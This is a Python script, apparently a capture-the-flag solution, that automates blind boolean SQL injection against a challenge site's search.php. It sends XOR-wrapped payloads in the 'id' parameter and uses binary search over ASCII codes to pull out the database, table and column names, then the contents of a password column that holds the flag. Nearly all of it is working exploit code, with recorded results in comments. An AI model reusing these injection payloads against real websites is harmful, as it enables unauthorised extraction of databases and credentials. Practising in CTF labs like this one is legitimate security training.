import requests
import sys
import time

def get_DBlen(url):
    for i in range(1, 21):
        db_url = url + f"?id=1^(length(database())={str(i)})^1"
        r = requests.get(db_url)
        if "Click" in r.text:
            return i
    return -1

def get_DBname(url, length):
    DBname=""
    for i in range(1, length + 1):
        max = 122
        min = 41 # All Common ASCII characters 
        while min < max:
            mid = (min + max) >> 1
            db_url = url + f"?id=1^(ascii(substr(database(),{str(i)},1))>{str(mid)})^1"
            r = requests.get(db_url)
            if "Click" in r.text:
                min = mid + 1
            else:
                max = mid       
        mid = min
        DBname += chr(mid)
    return DBname

def get_TBlen(url):
    for i in range(1, 100):
        db_url = url + f"?id=1^(length((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'))={str(i)})^1"
#        print(db_url)
        r = requests.get(db_url)
        if "Click" in r.text:
            return i
    return -1

def get_TBname(url, length):
    tbname = ""
    for i in range(1, length + 1):
        min = 41
        max = 122
        while min < max:
            mid = (min + max) >> 1
            db_url = url + f"?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),{str(i)},1))>{str(mid)})^1"
            r = requests.get(db_url)
            if "Click" in r.text:
                min = mid + 1
            else:
                max = mid
        mid = min
        tbname += chr(mid)
    return tbname

def get_CLlen(url):
    for i in range(1, 100):
        cl_url = url + f"?id=1^(length((select(group_concat(column_name))from(information_schema.columns)where(table_name)='F1naI1y'))={str(i)})^1"
#        print(db_url)
        r = requests.get(cl_url)
        if "Click" in r.text:
            return i
    return -1

def get_CLname(url, length):
    clname = ""
    for i in range(1, length + 1):
        min = 41
        max = 122
        while min < max:
            mid = (min + max) >> 1
            cl_url = url + f"?id=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)='F1naI1y'),{str(i)},1))>{str(mid)})^1"
            r = requests.get(cl_url)
            if "Click" in r.text:
                min = mid + 1
            else:
                max = mid
        mid = min
        clname += chr(mid)
    return clname

def get_PWlen(url):
    min = 1
    max = 1000
    while min < max:
        mid = (min + max) >> 1
        pw_url = url + f"?id=1^(length((select(group_concat(password))from(F1naI1y)))>{str(mid)})^1"
#        print(db_url)
        r = requests.get(pw_url)
        if "Click" in r.text:
            min = mid + 1
        elif "Error" in r.text:
            return -100
        else:
            max = mid
    mid = min
    return mid

def get_PWname(url, length):
    pwname = ""
    for i in range(170, length + 1): # 根据经验也可以只看后面的password
        min = 41
        max = 122
        while min < max:
            mid = (min + max) >> 1
            pw_url = url + f"?id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),{str(i)},1))>{str(mid)})^1"
            r = requests.get(pw_url)
            if "Click" in r.text:
                min = mid + 1
            else:
                max = mid
        mid = min
        pwname += chr(mid)
    return pwname

url = "http://5eb0077d-eb3d-435e-a13e-c2cc2fc0d166.node5.buuoj.cn:81/search.php"
# db_len = get_DBlen(url)
# print(f"Database name length: {db_len}")

# db_len = 4

# db_name = get_DBname(url, db_len)
# print(f"Database name: {db_name}")

# db_name='geek'

# tb_len = get_TBlen(url)
# print(f"Table names length: {tb_len}")

# tb_len = 16

# tb_name = get_TBname(url, 16)
# print(f"Table names: {tb_name}")

# tb_name='F1naI1y,Flaaaaag'
# 猜flag实际上是在前者里面

# cl_Len=get_CLlen(url)
# print(f"Column names length: {cl_Len}")

# cl_Len = 20

# cl_name = get_CLname(url, 20)
# print(f"Column names: {cl_name}")

# cl_name="id,username,password"

# pw_len = get_PWlen(url)
# print(f"Password length: {pw_len}")

# pw_len = 213

pw_name = get_PWname(url, 213)
print(f"Password: {pw_name}")

# pw_name = d,flagz0a381aba-2c3a-48e5-8098-7bc0e53415baz
# 这里的z因为我们的min-max范围里没有{}所以就变成最大的z了，手动改过来就可以，下次可以扩大一些范围

# flag{0a381aba-2c3a-48e5-8098-7bc0e53415ba}